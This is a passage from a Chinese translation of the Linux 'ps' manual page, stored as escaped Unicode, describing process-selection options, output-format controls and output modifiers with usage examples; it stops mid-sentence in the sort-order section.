\u9664\u4e0b\u6587\u6240\u8ff0\u5916\uff0c\u8fdb\u7a0b\u9009\u62e9\u9009\u9879\u662f\u7d2f\u52a0\u7684\u3002\u9ed8\u8ba4\u9009\u62e9\u88ab\u4e22\u5f03\uff0c\u7136\u540e\u5c06\u9009\u5b9a\u7684\u8fdb\u7a0b\u6dfb\u52a0\u5230\u8981\u663e\u793a\u7684 \u8fdb\u7a0b\u96c6\u4e2d\u3002\u56e0\u6b64\uff0c\u5982\u679c\u4e00\u4e2a\u8fdb\u7a0b\u7b26\u5408\u4efb\u4f55\u7ed9\u5b9a\u7684\u9009\u62e9\u6807\u51c6\uff0c\u5b83\u5c06\u88ab\u663e\u793a\u3002 \u793a\u4f8b \u4f7f\u7528\u6807\u51c6\u8bed\u6cd5\u67e5\u770b\u7cfb\u7edf\u4e0a\u7684\u6bcf\u4e2a\u8fdb\u7a0b\uff1a ps -e ps -ef ps -eF ps -ely \u4f7f\u7528 BSD \u8bed\u6cd5\u67e5\u770b\u7cfb\u7edf\u4e0a\u7684\u6bcf\u4e2a\u8fdb\u7a0b\uff1a ps ax ps axu \u6253\u5370\u8fdb\u7a0b\u6811\uff1a ps -ejH ps axjf \u83b7\u53d6\u7ebf\u7a0b\u4fe1\u606f\uff1a ps -eLf ps axms \u83b7\u53d6\u5b89\u5168\u4fe1\u606f\uff1a ps -eo euser,ruser,suser,fuser,f,comm,label ps axZ ps -eM \u4ee5\u7528\u6237\u683c\u5f0f\u67e5\u770b\u4ee5 root (\u771f\u5b9e\u548c\u6709\u6548 ID) \u8fd0\u884c\u7684\u6bcf\u4e2a\u8fdb\u7a0b\uff1a ps -U root -u root u \u67e5\u770b\u5177\u6709\u7528\u6237\u5b9a\u4e49\u683c\u5f0f\u7684\u6bcf\u4e2a\u8fdb\u7a0b\uff1a ps -eo pid,tid,class,rtprio,ni,pri,psr,pcpu,stat,wchan:14,comm ps axo stat,euid,ruid,tty,tpgid,sess,pgrp,ppid,pid,pcpu,comm ps -Ao pid,tt,user,fname,tmout,f,wchan \u4ec5\u6253\u5370 syslogd \u7684\u8fdb\u7a0b ID\uff1a ps -C syslogd -o pid= \u4ec5\u6253\u5370 PID 42 \u7684\u540d\u79f0\uff1a ps -q 42 -o comm= \u7b80\u5355\u7684\u8fdb\u7a0b\u9009\u62e9 a \u89e3\u9664 BSD \u98ce\u683c\u7684\u201c\u4ec5\u4f60\u81ea\u5df1\u201d\u9650\u5236\uff0c\u8be5\u9650\u5236\u5728\u4f7f\u7528\u67d0\u4e9b BSD \u98ce\u683c\uff08\u4e0d\u5e26\u201c-\u201d\uff09\u9009\u9879\u6216 ps \u4e2a\u6027\u8bbe\u7f6e\u4e3a BSD \u98ce\u683c\u65f6\u65bd\u52a0\u4e8e\u6240\u6709\u8fdb\u7a0b\u96c6\u3002\u5f53\u4ee5\u8fd9\u79cd\u65b9\u5f0f\u9009\u62e9\u8fdb\u7a0b\u65f6\uff0c\u8be5\u8fdb\u7a0b\u96c6\u5c06 \u88ab\u6dfb\u52a0\u5230\u901a\u8fc7\u5176\u4ed6\u65b9\u5f0f\u9009\u62e9\u7684\u8fdb\u7a0b\u96c6\u4e2d\u3002\u53e6\u4e00\u79cd\u63cf\u8ff0\u662f\uff0c\u6b64\u9009\u9879\u4f7f ps \u5217\u51fa\u6240\u6709\u5177\u6709 \u7ec8\u7aef (tty) \u7684\u8fdb\u7a0b\uff0c\u6216\u4e0e x \u9009\u9879\u4e00\u8d77\u4f7f\u7528\u65f6\u5217\u51fa\u6240\u6709\u8fdb\u7a0b\u3002 -A \u9009\u62e9\u6240\u6709\u8fdb\u7a0b\u3002\u4e0e -e \u76f8\u540c\u3002 -a \u9009\u62e9\u6240\u6709\u8fdb\u7a0b\uff0c\u4f46\u4f1a\u6392\u9664\u4f1a\u8bdd\u9886\u5bfc\u8005\uff08\u53c2\u89c1 getsid(2)\uff09\u548c\u672a\u4e0e\u7ec8\u7aef\u5173\u8054\u7684\u8fdb\u7a0b\u3002 -d \u9009\u62e9\u6240\u6709\u8fdb\u7a0b\uff0c\u4f46\u6392\u9664\u4f1a\u8bdd\u9886\u5bfc\u8005\u3002 --deselect \u9009\u62e9\u6240\u6709\u4e0d\u7b26\u5408\u6307\u5b9a\u6761\u4ef6\u7684\u8fdb\u7a0b\uff08\u5426\u5b9a\u9009\u62e9\uff09\u3002\u4e0e -N \u76f8\u540c\u3002 -e \u9009\u62e9\u6240\u6709\u8fdb\u7a0b\u3002\u4e0e -A \u76f8\u540c\u3002 g \u771f\u6b63\u6240\u6709\u8fdb\u7a0b\uff0c\u751a\u81f3\u5305\u62ec\u4f1a\u8bdd\u9886\u5bfc\u8005\u3002\u6b64\u6807\u5fd7\u5df2\u8fc7\u65f6\uff0c\u53ef\u80fd\u5728\u5c06\u6765\u7684\u7248\u672c\u4e2d\u5f03\u7528\u3002 \u901a\u5e38\u7531 a \u6807\u5fd7\u9690\u542b\uff0c\u4ec5\u5728 sunos4 \u4e2a\u6027\u64cd\u4f5c\u65f6\u6709\u7528\u3002 -N \u9009\u62e9\u6240\u6709\u4e0d\u7b26\u5408\u6307\u5b9a\u6761\u4ef6\u7684\u8fdb\u7a0b\uff08\u5426\u5b9a\u9009\u62e9\uff09\u3002\u4e0e --deselect \u76f8\u540c\u3002 T \u9009\u62e9\u4e0e\u6b64\u7ec8\u7aef\u5173\u8054\u7684\u6240\u6709\u8fdb\u7a0b\u3002\u4e0e\u4e0d\u5e26\u4efb\u4f55\u53c2\u6570\u7684 t \u9009\u9879\u76f8\u540c\u3002 r \u5c06\u9009\u62e9\u9650\u5236\u4e3a\u4ec5\u8fd0\u884c\u7684\u8fdb\u7a0b\u3002 x \u89e3\u9664 BSD \u98ce\u683c\u7684\u201c\u5fc5\u987b\u6709 tty\u201d\u9650\u5236\uff0c\u8be5\u9650\u5236\u5728\u4f7f\u7528\u67d0\u4e9b BSD \u98ce\u683c\uff08\u4e0d\u5e26\u201c-\u201d\uff09\u9009\u9879 \u6216 ps \u4e2a\u6027\u8bbe\u7f6e\u4e3a BSD \u98ce\u683c\u65f6\u65bd\u52a0\u4e8e\u6240\u6709\u8fdb\u7a0b\u96c6\u3002\u5f53\u4ee5\u8fd9\u79cd\u65b9\u5f0f\u9009\u62e9\u8fdb\u7a0b\u65f6\uff0c\u8be5 \u8fdb\u7a0b\u96c6\u5c06\u88ab\u6dfb\u52a0\u5230\u901a\u8fc7\u5176\u4ed6\u65b9\u5f0f\u9009\u62e9\u7684\u8fdb\u7a0b\u96c6\u4e2d\u3002\u53e6\u4e00\u79cd\u63cf\u8ff0\u662f\uff0c\u6b64\u9009\u9879\u4f7f ps \u5217\u51fa \u6240\u6709\u60a8\u62e5\u6709\u7684\u8fdb\u7a0b\uff08\u4e0e ps \u76f8\u540c\u7684 EUID\uff09\uff0c\u6216\u4e0e a \u9009\u9879\u4e00\u8d77\u4f7f\u7528\u65f6\u5217\u51fa\u6240\u6709\u8fdb\u7a0b\u3002 \u6309\u5217\u8868\u9009\u62e9\u8fdb\u7a0b \u8fd9\u4e9b\u9009\u9879\u63a5\u53d7\u4ee5\u7a7a\u683c\u5206\u9694\u6216\u9017\u53f7\u5206\u9694\u7684\u5217\u8868\u5f62\u5f0f\u7684\u5355\u4e2a\u53c2\u6570\u3002\u53ef\u4ee5\u591a\u6b21\u4f7f\u7528\u3002\u4f8b\u5982\uff1a ps -p \"1 2\" -p 3,4 -123 \u4e0e --pid 123 \u76f8\u540c\u3002 123 \u4e0e --pid 123 \u76f8\u540c\u3002 -C cmdlist \u6309\u547d\u4ee4\u540d\u79f0\u9009\u62e9\u3002\u8fd9\u9009\u62e9\u53ef\u6267\u884c\u540d\u79f0\u5728 cmdlist \u4e2d\u7ed9\u51fa\u7684\u8fdb\u7a0b\u3002\u6ce8\u610f\uff1a\u547d\u4ee4\u540d\u79f0\u4e0e \u547d\u4ee4\u884c\u4e0d\u540c\u3002\u4ee5\u524d\u7248\u672c\u7684 procps \u548c\u5185\u6838\u5c06\u6b64\u547d\u4ee4\u540d\u79f0\u622a\u65ad\u4e3a 15 \u4e2a\u5b57\u7b26\u3002\u6b64\u9650\u5236\u5728 \u4e24\u8005\u4e2d\u90fd\u4e0d\u518d\u5b58\u5728\u3002\u5982\u679c\u60a8\u4f9d\u8d56\u4e8e\u5339\u914d\u4ec5 15 \u4e2a\u5b57\u7b26\uff0c\u60a8\u53ef\u80fd\u4e0d\u518d\u5339\u914d\u3002 -G grplist \u6309\u5b9e\u9645\u7ec4 ID (RGID) \u6216\u540d\u79f0\u9009\u62e9\u3002\u8fd9\u9009\u62e9\u5b9e\u9645\u7ec4\u540d\u79f0\u6216 ID \u5728 grplist \u5217\u8868\u4e2d\u7684 \u8fdb\u7a0b\u3002\u5b9e\u9645\u7ec4 ID \u6807\u8bc6\u521b\u5efa\u8fdb\u7a0b\u7684\u7528\u6237\u7684\u7ec4\uff0c\u8bf7\u53c2\u89c1 getgid(2)\u3002 -g grplist \u6309\u4f1a\u8bdd\u6216\u6709\u6548\u7ec4\u540d\u9009\u62e9\u3002\u8bb8\u591a\u6807\u51c6\u6307\u5b9a\u6309\u4f1a\u8bdd\u9009\u62e9\uff0c\u4f46\u6309\u6709\u6548\u7ec4\u9009\u62e9\u662f\u5176\u4ed6\u51e0\u4e2a\u64cd\u4f5c \u7cfb\u7edf\u4f7f\u7528\u7684\u903b\u8f91\u884c\u4e3a\u3002\u5f53\u5217\u8868\u5b8c\u5168\u662f\u6570\u5b57\u65f6\uff08\u56e0\u4e3a\u4f1a\u8bdd\u662f\uff09\uff0c\u6b64 ps \u5c06\u6309\u4f1a\u8bdd\u9009\u62e9\u3002 \u7ec4 ID \u53f7\u4ec5\u5728\u540c\u65f6\u6307\u5b9a\u4e00\u4e9b\u7ec4\u540d\u65f6\u6709\u6548\u3002\u53c2\u89c1 -s \u548c --group \u9009\u9879\u3002 --Group grplist \u6309\u5b9e\u9645\u7ec4 ID (RGID) \u6216\u540d\u79f0\u9009\u62e9\u3002\u4e0e -G \u76f8\u540c\u3002 --group grplist \u6309\u6709\u6548\u7ec4 ID (EGID) \u6216\u540d\u79f0\u9009\u62e9\u3002\u8fd9\u9009\u62e9\u6709\u6548\u7ec4\u540d\u79f0\u6216 ID \u5728 grplist \u4e2d\u7684\u8fdb\u7a0b\u3002 \u6709\u6548\u7ec4 ID \u63cf\u8ff0\u8fdb\u7a0b\u4f7f\u7528\u7684\u6587\u4ef6\u8bbf\u95ee\u6743\u9650\u7684\u7ec4\uff08\u53c2\u89c1 getegid(2)\uff09\u3002-g \u9009\u9879\u901a\u5e38\u662f --group \u7684\u66ff\u4ee3\u54c1\u3002 p pidlist \u6309\u8fdb\u7a0b ID \u9009\u62e9\u3002\u4e0e -p \u548c --pid \u76f8\u540c\u3002 -p pidlist \u6309 PID \u9009\u62e9\u3002\u8fd9\u9009\u62e9\u8fdb\u7a0b ID \u53f7\u51fa\u73b0\u5728 pidlist \u4e2d\u7684\u8fdb\u7a0b\u3002\u4e0e p \u548c --pid \u76f8\u540c\u3002 --pid pidlist \u6309\u8fdb\u7a0b ID \u9009\u62e9\u3002\u4e0e -p \u548c p \u76f8\u540c\u3002 --ppid pidlist \u6309\u7236\u8fdb\u7a0b ID \u9009\u62e9\u3002\u8fd9\u9009\u62e9\u7236\u8fdb\u7a0b ID \u5728 pidlist \u4e2d\u7684\u8fdb\u7a0b\u3002\u4e5f\u5c31\u662f\u8bf4\uff0c\u5b83\u9009\u62e9 \u8fd9\u4e9b pidlist \u4e2d\u5217\u51fa\u7684\u8fdb\u7a0b\u7684\u5b50\u8fdb\u7a0b\u3002 q pidlist \u6309\u8fdb\u7a0b ID \u9009\u62e9\uff08\u5feb\u901f\u6a21\u5f0f\uff09\u3002\u4e0e -q \u548c --quick-pid \u76f8\u540c\u3002 -q pidlist \u6309 PID \u9009\u62e9\uff08\u5feb\u901f\u6a21\u5f0f\uff09\u3002\u8fd9\u9009\u62e9\u8fdb\u7a0b ID \u53f7\u51fa\u73b0\u5728 pidlist \u4e2d\u7684\u8fdb\u7a0b\u3002\u5728\u6b64\u9009\u9879 \u4e0b\uff0cps \u4ec5\u8bfb\u53d6 pidlist \u4e2d\u5217\u51fa\u7684 pid \u6240\u9700\u7684\u4fe1\u606f\uff0c\u5e76\u4e14\u4e0d\u5e94\u7528\u5176\u4ed6\u8fc7\u6ee4\u89c4\u5219\u3002 pid \u7684\u987a\u5e8f\u662f\u672a\u6392\u5e8f\u7684\uff0c\u5e76\u4fdd\u6301\u4e0d\u53d8\u3002\u5728\u6b64\u6a21\u5f0f\u4e0b\u4e0d\u5141\u8bb8\u5176\u4ed6\u9009\u62e9\u9009\u9879\u3001\u6392\u5e8f\u548c\u68ee\u6797 \u7c7b\u578b\u5217\u8868\u3002\u4e0e q \u548c --quick-pid \u76f8\u540c\u3002 --quick-pid pidlist \u6309\u8fdb\u7a0b ID \u9009\u62e9\uff08\u5feb\u901f\u6a21\u5f0f\uff09\u3002\u4e0e -q \u548c q \u76f8\u540c\u3002 -s sesslist \u6309\u4f1a\u8bdd ID \u9009\u62e9\u3002\u8fd9\u9009\u62e9\u4f1a\u8bdd ID \u6307\u5b9a\u5728 sesslist \u4e2d\u7684\u8fdb\u7a0b\u3002 --sid sesslist \u6309\u4f1a\u8bdd ID \u9009\u62e9\u3002\u4e0e -s \u76f8\u540c\u3002 t ttylist \u6309 tty \u9009\u62e9\u3002\u51e0\u4e4e\u4e0e -t \u548c --tty \u76f8\u540c\uff0c\u4f46\u4e5f\u53ef\u4ee5\u4e0e\u7a7a ttylist \u4e00\u8d77\u4f7f\u7528\u4ee5\u6307\u793a \u4e0e ps \u5173\u8054\u7684\u7ec8\u7aef\u3002\u4f7f\u7528 T \u9009\u9879\u6bd4\u4f7f\u7528\u5e26\u7a7a ttylist \u7684 t \u66f4\u5e72\u51c0\u3002 -t ttylist \u6309 tty \u9009\u62e9\u3002\u8fd9\u9009\u62e9\u4e0e ttylist \u4e2d\u7ed9\u5b9a\u7684\u7ec8\u7aef\u5173\u8054\u7684\u8fdb\u7a0b\u3002\u7ec8\u7aef\uff08tty\uff0c\u6216\u7528\u4e8e\u6587\u672c \u8f93\u51fa\u7684\u5c4f\u5e55\uff09\u53ef\u4ee5\u4ee5\u51e0\u79cd\u5f62\u5f0f\u6307\u5b9a\uff1a/dev/ttyS1\uff0cttyS1\uff0cS1\u3002\u53ef\u4ee5\u4f7f\u7528\u666e\u901a\u7684\u201c-\u201d\u6765\u9009\u62e9 \u672a\u9644\u52a0\u5230\u4efb\u4f55\u7ec8\u7aef\u7684\u8fdb\u7a0b\u3002 --tty ttylist \u6309\u7ec8\u7aef\u9009\u62e9\u3002\u4e0e -t \u548c t \u76f8\u540c\u3002 U userlist \u6309\u6709\u6548\u7528\u6237 ID (EUID) \u6216\u540d\u79f0\u9009\u62e9\u3002\u8fd9\u9009\u62e9\u6709\u6548\u7528\u6237\u540d\u6216 ID \u5728 userlist \u4e2d\u7684\u8fdb\u7a0b\u3002 \u6709\u6548\u7528\u6237 ID \u63cf\u8ff0\u8fdb\u7a0b\u4f7f\u7528\u7684\u6587\u4ef6\u8bbf\u95ee\u6743\u9650\u7684\u7528\u6237\uff08\u53c2\u89c1 geteuid(2)\uff09\u3002\u4e0e -u \u548c --user \u76f8\u540c\u3002 -U userlist \u6309\u5b9e\u9645\u7528\u6237 ID (RUID) \u6216\u540d\u79f0\u9009\u62e9\u3002\u8fd9\u9009\u62e9\u5b9e\u9645\u7528\u6237\u540d\u6216 ID \u5728 userlist \u5217\u8868\u4e2d \u7684\u8fdb\u7a0b\u3002\u5b9e\u9645\u7528\u6237 ID \u6807\u8bc6\u521b\u5efa\u8fdb\u7a0b\u7684\u7528\u6237\uff0c\u8bf7\u53c2\u89c1 getuid(2)\u3002 -u userlist \u6309\u6709\u6548\u7528\u6237 ID (EUID) \u6216\u540d\u79f0\u9009\u62e9\u3002\u8fd9\u9009\u62e9\u6709\u6548\u7528\u6237\u540d\u6216 ID \u5728 userlist \u4e2d\u7684\u8fdb\u7a0b\u3002 \u6709\u6548\u7528\u6237 ID \u63cf\u8ff0\u8fdb\u7a0b\u4f7f\u7528\u7684\u6587\u4ef6\u8bbf\u95ee\u6743\u9650\u7684\u7528\u6237\uff08\u53c2\u89c1 geteuid(2)\uff09\u3002\u4e0e U \u548c --user \u76f8\u540c\u3002 --User userlist \u6309\u5b9e\u9645\u7528\u6237 ID (RUID) \u6216\u540d\u79f0\u9009\u62e9\u3002\u4e0e -U \u76f8\u540c\u3002 --user userlist \u6309\u6709\u6548\u7528\u6237 ID (EUID) \u6216\u540d\u79f0\u9009\u62e9\u3002\u4e0e -u \u548c U \u76f8\u540c\u3002 \u8f93\u51fa\u683c\u5f0f\u63a7\u5236 \u8fd9\u4e9b\u9009\u9879\u7528\u4e8e\u9009\u62e9 ps \u663e\u793a\u7684\u4fe1\u606f\u3002\u8f93\u51fa\u53ef\u80fd\u56e0\u4e2a\u6027\u800c\u5f02\u3002 -c \u5bf9 -l \u9009\u9879\u663e\u793a\u4e0d\u540c\u7684\u8c03\u5ea6\u5668\u4fe1\u606f\u3002 --context \u663e\u793a\u5b89\u5168\u4e0a\u4e0b\u6587\u683c\u5f0f\uff08\u9488\u5bf9 SELinux\uff09\u3002 -f \u5b8c\u6574\u683c\u5f0f\u5217\u8868\u3002\u6b64\u9009\u9879\u53ef\u4ee5\u4e0e\u8bb8\u591a\u5176\u4ed6 UNIX \u98ce\u683c\u9009\u9879\u7ed3\u5408\u4f7f\u7528\uff0c\u4ee5\u6dfb\u52a0\u989d\u5916\u7684\u5217\u3002 \u5b83\u8fd8\u4f1a\u6253\u5370\u547d\u4ee4\u53c2\u6570\u3002\u4e0e -L \u7ed3\u5408\u4f7f\u7528\u65f6\uff0c\u5c06\u6dfb\u52a0 NLWP\uff08\u7ebf\u7a0b\u6570\uff09\u548c LWP\uff08\u7ebf\u7a0b ID\uff09 \u5217\u3002\u53c2\u89c1 c \u9009\u9879\u3001\u683c\u5f0f\u5173\u952e\u5b57 args \u548c\u683c\u5f0f\u5173\u952e\u5b57 comm\u3002 -F \u989d\u5916\u5b8c\u6574\u683c\u5f0f\u3002\u53c2\u89c1 -f \u9009\u9879\uff0c-F \u9690\u542b\u8be5\u9009\u9879\u3002 --format format \u7528\u6237\u5b9a\u4e49\u7684\u683c\u5f0f\u3002\u4e0e -o \u548c o \u76f8\u540c\u3002 j BSD \u4f5c\u4e1a\u63a7\u5236\u683c\u5f0f\u3002 -j \u4f5c\u4e1a\u683c\u5f0f\u3002 l \u663e\u793a BSD \u957f\u683c\u5f0f\u3002 -l \u957f\u683c\u5f0f\u3002-y \u9009\u9879\u901a\u5e38\u4e0e\u6b64\u9009\u9879\u4e00\u8d77\u4f7f\u7528\u5f88\u6709\u7528\u3002 -M \u6dfb\u52a0\u4e00\u5217\u5b89\u5168\u6570\u636e\u3002\u4e0e Z \u76f8\u540c\uff08\u9488\u5bf9 SELinux\uff09\u3002 O format \u9884\u52a0\u8f7d\u7684 o\uff08\u91cd\u8f7d\uff09\u3002BSD O \u9009\u9879\u53ef\u4ee5\u50cf -O\uff08\u5e26\u6709\u4e00\u4e9b\u9884\u5b9a\u4e49\u5b57\u6bb5\u7684\u7528\u6237\u5b9a\u4e49\u8f93\u51fa\u683c\u5f0f\uff09 \u4e00\u6837\u8fd0\u884c\uff0c\u4e5f\u53ef\u4ee5\u7528\u4e8e\u6307\u5b9a\u6392\u5e8f\u987a\u5e8f\u3002\u4f7f\u7528\u542f\u53d1\u5f0f\u65b9\u6cd5\u786e\u5b9a\u6b64\u9009\u9879\u7684\u884c\u4e3a\u3002\u4e3a\u4e86\u786e\u4fdd \u83b7\u5f97\u6240\u9700\u7684\u884c\u4e3a\uff08\u6392\u5e8f\u6216\u683c\u5f0f\uff09\uff0c\u8bf7\u4ee5\u5176\u4ed6\u65b9\u5f0f\u6307\u5b9a\u9009\u9879\uff08\u4f8b\u5982\uff0c\u4f7f\u7528 -O \u6216 --sort\uff09\u3002 \u5f53\u7528\u4f5c\u683c\u5f0f\u9009\u9879\u65f6\uff0c\u5b83\u4e0e -O \u76f8\u540c\uff0c\u5e26\u6709 BSD \u4e2a\u6027\u3002 -O format \u7c7b\u4f3c\u4e8e -o\uff0c\u4f46\u9884\u52a0\u8f7d\u4e86\u4e00\u4e9b\u9ed8\u8ba4\u5217\u3002\u4e0e -o pid,format,state,tname,time,command \u6216 -o pid,format,tname,time,cmd \u76f8\u540c\uff0c\u53c2\u89c1\u4e0b\u6587 -o\u3002 o format \u6307\u5b9a\u7528\u6237\u5b9a\u4e49\u7684\u683c\u5f0f\u3002\u4e0e -o \u548c --format \u76f8\u540c\u3002 -o format \u7528\u6237\u5b9a\u4e49\u7684\u683c\u5f0f\u3002\u683c\u5f0f\u662f\u4ee5\u7a7a\u683c\u5206\u9694\u6216\u9017\u53f7\u5206\u9694\u7684\u5217\u8868\u5f62\u5f0f\u7684\u5355\u4e2a\u53c2\u6570\uff0c\u63d0\u4f9b\u4e00\u79cd \u6307\u5b9a\u5355\u72ec\u8f93\u51fa\u5217\u7684\u65b9\u6cd5\u3002\u6807\u51c6\u683c\u5f0f\u8bf4\u660e\u7b26\u90e8\u5206\u4e2d\u63cf\u8ff0\u4e86\u5df2\u8bc6\u522b\u7684\u5173\u952e\u5b57\u3002\u53ef\u4ee5\u6839\u636e \u9700\u8981\u91cd\u547d\u540d\u6807\u9898\uff08ps -o pid,ruser=RealUser -o comm=Command\uff09\u3002\u5982\u679c\u6240\u6709\u5217\u6807\u9898\u90fd \u662f\u7a7a\u7684\uff08ps -o pid= -o comm=\uff09\uff0c\u5219\u4e0d\u4f1a\u8f93\u51fa\u6807\u9898\u884c\u3002\u5217\u5bbd\u4f1a\u6839\u636e\u9700\u8981\u589e\u52a0\uff0c\u4ee5\u9002\u5e94 \u5bbd\u6807\u9898\uff1b\u8fd9\u53ef\u7528\u4e8e\u52a0\u5bbd\u8bf8\u5982 WCHAN\uff08ps -o pid,wchan=WIDE-WCHAN-COLUMN -o comm\uff09 \u4e4b\u7c7b\u7684\u5217\u3002\u8fd8\u63d0\u4f9b\u4e86\u663e\u5f0f\u5bbd\u5ea6\u63a7\u5236\uff08ps opid,wchan:42,cmd\uff09\u3002ps -o pid=X,comm=Y \u7684 \u884c\u4e3a\u56e0\u4e2a\u6027\u800c\u5f02\uff1b\u8f93\u51fa\u53ef\u80fd\u662f\u4e00\u4e2a\u540d\u4e3a\u201cX,comm=Y\u201d\u7684\u5217\uff0c\u6216\u4e24\u4e2a\u540d\u4e3a\u201cX\u201d\u548c\u201cY\u201d\u7684\u5217\u3002 \u5f53\u6709\u7591\u95ee\u65f6\uff0c\u8bf7\u4f7f\u7528\u591a\u4e2a -o \u9009\u9879\u3002\u4f7f\u7528 PS_FORMAT \u73af\u5883\u53d8\u91cf\u6307\u5b9a\u6240\u9700\u7684\u9ed8\u8ba4\u503c\uff1b DefSysV \u548c DefBSD \u662f\u5b8f\uff0c\u53ef\u7528\u4e8e\u9009\u62e9\u9ed8\u8ba4\u7684 UNIX \u6216 BSD \u5217\u3002 s \u663e\u793a\u4fe1\u53f7\u683c\u5f0f\u3002 u \u663e\u793a\u9762\u5411\u7528\u6237\u7684\u683c\u5f0f\u3002 v \u663e\u793a\u865a\u62df\u5185\u5b58\u683c\u5f0f\u3002 X \u5bc4\u5b58\u5668\u683c\u5f0f\u3002 -y \u4e0d\u663e\u793a\u6807\u5fd7\uff1b\u7528 rss \u66ff\u4ee3 addr\u3002\u6b64\u9009\u9879\u53ea\u80fd\u4e0e -l \u4e00\u8d77\u4f7f\u7528\u3002 Z \u6dfb\u52a0\u4e00\u5217\u5b89\u5168\u6570\u636e\u3002\u4e0e -M \u76f8\u540c\uff08\u9488\u5bf9 SELinux\uff09\u3002 \u8f93\u51fa\u4fee\u9970\u7b26 c \u663e\u793a\u771f\u5b9e\u7684\u547d\u4ee4\u540d\u79f0\u3002\u6b64\u540d\u79f0\u53d6\u81ea\u53ef\u6267\u884c\u6587\u4ef6\u7684\u540d\u79f0\uff0c\u800c\u4e0d\u662f argv \u503c\u3002\u56e0\u6b64\uff0c\u4e0d\u4f1a \u663e\u793a\u547d\u4ee4\u53c2\u6570\u53ca\u5176\u4efb\u4f55\u4fee\u6539\u3002\u6b64\u9009\u9879\u5b9e\u9645\u4e0a\u5c06 args \u683c\u5f0f\u5173\u952e\u5b57\u8f6c\u6362\u4e3a comm \u683c\u5f0f\u5173\u952e\u5b57\uff1b \u5b83\u4e0e -f \u683c\u5f0f\u9009\u9879\u4ee5\u53ca\u901a\u5e38\u663e\u793a\u547d\u4ee4\u53c2\u6570\u7684\u5404\u79cd BSD \u98ce\u683c\u683c\u5f0f\u9009\u9879\u4e00\u8d77\u4f7f\u7528\u975e\u5e38\u6709\u7528\u3002 \u53c2\u89c1 -f \u9009\u9879\u3001\u683c\u5f0f\u5173\u952e\u5b57 args \u548c\u683c\u5f0f\u5173\u952e\u5b57 comm\u3002 --cols n \u8bbe\u7f6e\u5c4f\u5e55\u5bbd\u5ea6\u3002 --columns n \u8bbe\u7f6e\u5c4f\u5e55\u5bbd\u5ea6\u3002 --cumulative \u5305\u542b\u4e00\u4e9b\u5df2\u6b7b\u4ea1\u7684\u5b50\u8fdb\u7a0b\u6570\u636e\uff08\u4f5c\u4e3a\u7236\u8fdb\u7a0b\u7684\u603b\u548c\uff09\u3002 e \u663e\u793a\u547d\u4ee4\u540e\u7684\u73af\u5883\u3002 f ASCII \u827a\u672f\u8fdb\u7a0b\u5c42\u6b21\u7ed3\u6784\uff08\u68ee\u6797\uff09\u3002 --forest ASCII \u827a\u672f\u8fdb\u7a0b\u6811\u3002 h \u65e0\u6807\u9898\u3002\uff08\u6216\u8005\uff0c\u5728 BSD \u4e2a\u6027\u4e2d\uff0c\u6bcf\u5c4f\u5e55\u4e00\u4e2a\u6807\u9898\uff09\u3002h \u9009\u9879\u5b58\u5728\u95ee\u9898\u3002\u6807\u51c6 BSD ps \u4f7f\u7528\u6b64\u9009\u9879\u5728\u6bcf\u9875\u8f93\u51fa\u4e0a\u6253\u5370\u6807\u9898\uff0c\u4f46\u65e7\u7684 Linux ps \u4f7f\u7528\u6b64\u9009\u9879\u5b8c\u5168\u7981\u7528\u6807\u9898\u3002\u6b64\u7248\u672c \u7684 ps \u9075\u5faa Linux \u7528\u6cd5\uff0c\u9664\u975e\u9009\u62e9\u4e86 BSD \u4e2a\u6027\uff0c\u5426\u5219\u4e0d\u4f1a\u6253\u5370\u6807\u9898\uff0c\u5728\u8fd9\u79cd\u60c5\u51b5\u4e0b\uff0c\u5b83\u4f1a \u5728\u6bcf\u9875\u8f93\u51fa\u4e0a\u6253\u5370\u6807\u9898\u3002\u65e0\u8bba\u5f53\u524d\u4e2a\u6027\u5982\u4f55\uff0c\u60a8\u90fd\u53ef\u4ee5\u4f7f\u7528\u957f\u9009\u9879 --headers \u548c --no-headers \u5206\u522b\u542f\u7528\u6bcf\u9875\u6253\u5370\u6807\u9898\u6216\u5b8c\u5168\u7981\u7528\u6807\u9898\u3002 -H \u663e\u793a\u8fdb\u7a0b\u5c42\u6b21\u7ed3\u6784\uff08\u68ee\u6797\uff09\u3002 --headers \u91cd\u590d\u6807\u9898\u884c\uff0c\u6bcf\u9875\u4e00\u884c\u3002 k spec \u6307\u5b9a\u6392\u5e8f\u987a\u5e8f\u3002\u6392\u5e8f\u8bed\u6cd5\u4e3a[+|-]key[,[+|-]key[,...]]\u3002\u4ece\u6807\u51c6\u683c\u5f0f\u8bf4\u660e\u7b26\u90e8\u5206\u4e2d\u9009\u62e9 \u591a\u5b57\u6bcd\u952e\u3002\u7531\u4e8e\u9ed8\u8ba4\u65b9\u5411\u662f\u9012\u589e\u7684\u6570\u5b57\u6216\u5b57\u6bcd\u987a\u5e8f\uff0c\u56e0\u6b64\u201c+\u201d\u662f\u53ef\u9009\u7684\u3002\u4e0e --sort \u76f8\u540c\u3002 \u793a\u4f8b\uff1a ps jaxkuid,-ppid,+pid ps axk comm o comm,args ps kstart_time -ef --lines n \u8bbe\u7f6e\u5c4f\u5e55\u9ad8\u5ea6\u3002 n WCHAN \u548c USER\uff08\u5305\u62ec\u6240\u6709\u7c7b\u578b\u7684 UID \u548c GID\uff09\u4f7f\u7528\u6570\u5b57\u8f93\u51fa\u3002 --no-headers \u5b8c\u5168\u4e0d\u6253\u5370\u6807\u9898\u884c\u3002--no-heading \u662f\u6b64\u9009\u9879\u7684\u522b\u540d\u3002 O order \u6392\u5e8f\u987a\u5e8f\uff08\u91cd\u8f7d\uff09\u3002BSD O \u9009\u9879\u53ef\u4ee5\u50cf -O\uff08\u5e26\u6709\u4e00\u4e9b\u9884\u5b9a\u4e49\u5b57\u6bb5\u7684\u7528\u6237\u5b9a\u4e49\u8f93\u51fa\u683c\u5f0f\uff09 \u4e00\u6837\u8fd0\u884c\uff0c\u4e5f\u53ef\u4ee5\u7528\u4e8e\u6307\u5b9a\u6392\u5e8f\u987a\u5e8f\u3002\u4f7f\u7528\u542f\u53d1\u5f0f\u65b9\u6cd5\u786e\u5b9a\u6b64\u9009\u9879\u7684\u884c\u4e3a\u3002\u4e3a\u4e86\u786e\u4fdd\u83b7\u5f97 \u6240\u9700\u7684\u884c\u4e3a\uff08\u6392\u5e8f\u6216\u683c\u5f0f\uff09\uff0c\u8bf7\u4ee5\u5176\u4ed6\u65b9\u5f0f\u6307\u5b9a\u9009\u9879\uff08\u4f8b\u5982\uff0c\u4f7f\u7528 -O \u6216 --sort\uff09\u3002 \u5bf9\u4e8e\u6392\u5e8f\uff0c\u8fc7\u65f6\u7684 BSD O 